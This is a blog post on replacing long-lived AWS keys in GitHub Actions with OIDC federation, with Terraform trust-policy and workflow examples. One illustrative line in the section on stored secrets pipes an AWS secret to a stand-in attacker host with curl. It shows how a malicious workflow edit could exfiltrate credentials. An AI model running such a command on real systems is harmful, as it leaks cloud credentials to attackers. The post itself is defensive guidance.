---
title: "🔑 GitHub OIDC for AWS: Fire Your Long-Lived Secrets Before They Fire You"
date: "2026-07-04"
excerpt: "AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY sitting in your repo secrets for two years, never rotated, quietly waiting to end up in a leaked log line. Here's how to replace them with GitHub's OIDC federation — tokens that expire before an attacker can even finish their coffee."
tags:
  - security
  - aws
  - github-actions
  - devops
  - cybersecurity
featured: true
---

Go check your GitHub Actions secrets right now. I'll wait.

Found an `AWS_ACCESS_KEY_ID` in there? Cool. Now go check IAM and tell me when it was last rotated. If your honest answer is "I genuinely don't know," congratulations — you've just discovered the single most common finding in every cloud security audit ever performed. A static AWS key, sitting in a secrets store, with permissions nobody's reviewed since the intern who set it up left for a "better opportunity" in 2024.

Here's the uncomfortable truth: **that key doesn't expire.** It doesn't care if your repo is public, private, or leaked in a `console.log` someone forgot to remove. It works forever, from anywhere, until a human remembers to rotate it — which, statistically, is never.

There's a better way, and AWS + GitHub have supported it for years: **OIDC federation**. No stored secret. No rotation cron job. Tokens that self-destruct in about 15 minutes. Let's fix this properly.

## The Problem With "Just Store It as a Secret"

The classic setup looks innocent enough:

```yaml
# The pattern everyone copy-pastes from Stack Overflow in 2021
# and nobody has touched since
- name: Configure AWS credentials
  uses: aws-actions/configure-aws-credentials@v2
  with:
    aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
    aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
    aws-region: us-east-1
```

This works. It also means:

- That key exists in AWS **right now**, valid indefinitely, sitting in a GitHub Secrets store you don't control the encryption keys for.
- Anyone with write access to workflow files can `echo $AWS_SECRET_ACCESS_KEY | curl -d @- evil.example.com` and exfiltrate it in a PR that looks like a typo fix.
- A misconfigured `pull_request_target` trigger + a malicious fork PR can leak secrets to attacker-controlled code before a human ever reviews it.
- When (not if) it leaks, someone has to notice, revoke it, issue a new one, and update it everywhere it's used — usually after the breach, not before.

At Cubet, we inherited a legacy pipeline that had exactly this pattern: one IAM user, `ci-deploy`, with `AdministratorAccess` attached "temporarily" during a migration two years prior. Nobody remembered why it had that scope. Nobody wanted to be the one who broke prod by removing it. That's not a technical debt problem — that's a live incident waiting for a trigger.

## Enter OIDC: No Secret to Steal Because There's No Secret

Here's the actual shift in thinking: instead of GitHub holding a long-lived AWS credential, AWS trusts GitHub's identity token **directly**, per workflow run, and hands out a credential that's valid for minutes.

The flow:

1. GitHub Actions generates a signed OIDC token describing *this specific run* — repo, branch, workflow, even the specific job.
2. Your workflow presents that token to AWS STS via `AssumeRoleWithWebIdentity`.
3. AWS checks the token's signature against GitHub's public OIDC provider, checks your IAM role's trust policy conditions, and — if everything matches — issues temporary credentials.
4. Those credentials expire. No rotation, no leaked static secret, no standing access between runs.

First, register GitHub as an OIDC identity provider in AWS (one-time setup, via Terraform ideally):

```hcl
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}
```

Then create a role that trusts it — and this is the part people get lazy about — **scope the trust condition tightly**:

```hcl
resource "aws_iam_role" "gha_deploy" {
  name = "gha-deploy-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Federated = aws_iam_openid_connect_provider.github.arn }
      Action    = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringEquals = {
          "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
        }
        StringLike = {
          # Locks this role to ONE repo, main branch only.
          # Without this, ANY repo in your org's tokens could assume this role.
          "token.actions.githubusercontent.com:sub" = "repo:your-org/your-repo:ref:refs/heads/main"
        }
      }
    }]
  })
}
```

That `sub` condition is the whole ballgame. Skip it, and you've built a trust relationship that says "any GitHub Actions workflow, from any repo I own, from any branch, can become this IAM role." That's not federation, that's just a differently-shaped version of the same over-broad access you were trying to escape.

Finally, the workflow side gets *simpler*, not more complex:

```yaml
permissions:
  id-token: write   # required — this is what lets GitHub mint the OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-role
          aws-region: us-east-1
      - run: aws s3 sync ./dist s3://my-static-site
```

No `AWS_ACCESS_KEY_ID`. No `AWS_SECRET_ACCESS_KEY`. Nothing to leak, because there's nothing sitting around waiting to be leaked. If a token from this run somehow ended up in a log, it's expired before most people finish reading the incident Slack thread.

## Where This Bites You in Practice

Two things trip people up every time:

**Wildcard `sub` conditions that are wider than intended.** `repo:your-org/*:*` looks convenient and quietly means every repo and every branch in the org can assume the role. Scope to the exact repo, and to `ref:refs/heads/main` or `environment:production` rather than leaving it open.

**Forgetting `pull_request` workflows shouldn't get this role at all.** A PR from a fork triggers workflows using the *fork's* context, and if your trust policy is scoped by branch instead of by trigger event, a crafted PR can sometimes still satisfy the condition depending on how you've set things up. Keep deploy roles reserved for workflows triggered on `push` to protected branches, never on `pull_request` from forks.

## The Migration Isn't Scary

If you're staring at a repo full of static AWS keys thinking this is a big lift — it's usually a half-day job per pipeline: register the OIDC provider once, write one scoped IAM role per environment, swap the credentials step, delete the old IAM user, and rotate out the secret from GitHub. The payoff is a category of incident — "leaked long-lived cloud credential" — that simply can't happen anymore, because there's no long-lived credential to leak.

Have you migrated your pipelines to OIDC yet, or is there still a `.env.ci` floating around with a key from 2023 in it? Tell me your horror stories.

📧 Reach me: [hello@iamanuragh.in](mailto:hello@iamanuragh.in)
🐙 GitHub: [@kpanuragh](https://github.com/kpanuragh)
💼 LinkedIn: [Anuragh KP](https://linkedin.com/in/kpanuragh)

Go rotate something. You know the one.
